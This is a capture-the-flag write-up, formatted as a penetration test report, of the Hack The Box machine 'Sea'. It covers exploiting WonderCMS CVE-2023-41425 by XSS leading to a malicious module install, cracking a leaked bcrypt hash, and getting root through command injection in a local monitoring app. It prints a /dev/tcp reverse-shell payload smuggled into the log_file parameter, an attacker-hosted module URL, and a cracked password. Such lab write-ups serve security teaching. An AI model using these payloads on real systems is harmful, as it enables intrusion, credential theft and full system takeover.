# Penetration Test Report — Sea

![Difficulty](https://img.shields.io/badge/difficulty-Easy-green) ![OS](https://img.shields.io/badge/OS-Linux-red) ![Focus](https://img.shields.io/badge/focus-WonderCMS%20XSS%E2%86%92RCE%20%2F%20command%20injection-lightgrey)

## Executive Summary

An authorized assessment of `target.htb` exploited **CVE-2023-41425**, a stored XSS in WonderCMS 3.2.0, to install a malicious theme module via a social-engineered administrator, yielding a reverse shell as `www-data`. A bcrypt hash recovered from the CMS database file cracked to a password reused by user `amay`. Privilege escalation abused a command injection in a custom system-monitoring web application listening on localhost, producing a root shell.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | WonderCMS 3.2.0 — XSS to RCE via malicious module (CVE-2023-41425) | High |
| 2 | Crackable bcrypt password in `database.js` + password reuse | High |
| 3 | Command injection in custom monitoring app (`log_file` parameter) | Critical |
| 4 | Sensitive theme files (`README.md`, `version`) publicly readable | Low |

## Technical Walkthrough

### 1. Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 target.htb | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV target.htb
echo "target.htb sea.htb" | sudo tee -a /etc/hosts
```

SSH (22) and Apache (80). Content discovery revealed `themes/bike/`:

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u "http://sea.htb/FUZZ" -c -v
ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt \
  -u "http://sea.htb/themes/bike/FUZZ" -t 200 -fc 403
```

```bash
curl http://sea.htb/themes/bike/README.md   # WonderCMS
curl http://sea.htb/themes/bike/version     # 3.2.0
```

### 2. Foothold — CVE-2023-41425 (XSS → module install → RCE)

The public PoC writes `xss.js`, which (when an admin visits the crafted login URL) steals the CSRF token and installs a malicious "theme" containing a reverse shell. The module was hosted locally and the PoC adjusted:

```bash
wget https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip
# fix in xss.js: point installModule to our server and hardcode the base URL
# var urlWithoutLogBase = "http://sea.htb";
# installModule=http://<attacker-ip>:8000/main.zip
```

```bash
nc -lvvp 4444
python3 exploit.py http://sea.htb/index.php?page=LoginURL <attacker-ip> 4444
# send the generated link via the site's contact form
```

After the admin clicked the link (delivered via the contact form), a reverse shell as `www-data` was received.

### 3. Lateral Movement — bcrypt Crack & Reuse

The WonderCMS database leaked a password hash:

```bash
cat /var/www/sea/data/database.js
# $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q

echo '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > hash.txt   # backslashes removed
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# mychemicalromance
```

Password reuse succeeded for `amay` (`su amay`); user flag at `/home/amay/user.txt`.

### 4. Privilege Escalation — Command Injection in Monitoring App

`netstat -ntlp` revealed a localhost-only service on **8080**. SSH port-forward:

```bash
ssh amay@sea.htb -L 8080:127.0.0.1:8080
```

Authenticated with `amay:mychemicalromance`, the app offered a log-analysis feature whose `log_file` parameter executed shell commands. Verified with `; touch /tmp/test.txt` (created as root), then a reverse shell payload (URL-encoded in Burp):

```
log_file=/var/log/apache2/;bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'&analyze_log=
```

```bash
nc -lvvp 4444   # → root shell
```

Root flag: `/root/root.txt`.

## Remediation

- Upgrade WonderCMS beyond 3.2.0; sanitize the loginURL parameter; enforce CSP.
- Serve CMS data files outside the webroot; enforce strong, unique admin passwords (bcrypt is not a excuse for weak inputs).
- Eliminate shell-based log processing; sanitize file-path inputs; run internal admin tools under least privilege (never root).
- Bind admin panels behind VPN/SSO rather than localhost-only assumptions.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1189/T1190 — Drive-by/Exploit Public-Facing App (XSS→RCE) |
| Credential Access | T1110.002 — Password Cracking (bcrypt) |
| Execution | T1059 — Command Injection |
| Privilege Escalation | T1078 — Valid Accounts (password reuse) |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
